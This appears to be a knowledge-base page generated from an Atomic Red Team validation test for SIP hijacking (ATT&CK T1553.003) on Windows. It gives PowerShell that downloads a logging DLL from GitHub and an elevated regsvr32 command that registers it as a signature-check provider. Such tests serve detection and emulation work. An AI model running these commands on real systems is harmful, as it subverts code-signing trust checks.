---
atomic_guid: "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675"
title: "SIP (Subject Interface Package) Hijacking via Custom DLL"
framework: "atomic"
generated: "true"
attack_technique_id: "T1553.003"
attack_technique_name: "Subvert Trust Controls: SIP and Trust Provider Hijacking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.003/T1553.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675"
  - "SIP (Subject Interface Package) Hijacking via Custom DLL"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# SIP (Subject Interface Package) Hijacking via Custom DLL

Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from 
https://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing
the system to utilize it during signature checks, and logging said checks.

## Metadata

- Atomic GUID: e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675
- Technique: T1553.003: Subvert Trust Controls: SIP and Trust Provider Hijacking
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1553.003/T1553.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1553-subvert_trust_controls|T1553.003]]

## Input Arguments

### dll_payload

- description: Path to GTSIPProvider.dll
- type: path
- default: PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll

## Dependencies

GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})

### Prerequisite Check

```powershell
if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
regsvr32.exe #{dll_payload}
```

### Cleanup

```cmd
regsvr32.exe /u #{dll_payload}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.003/T1553.003.yaml)
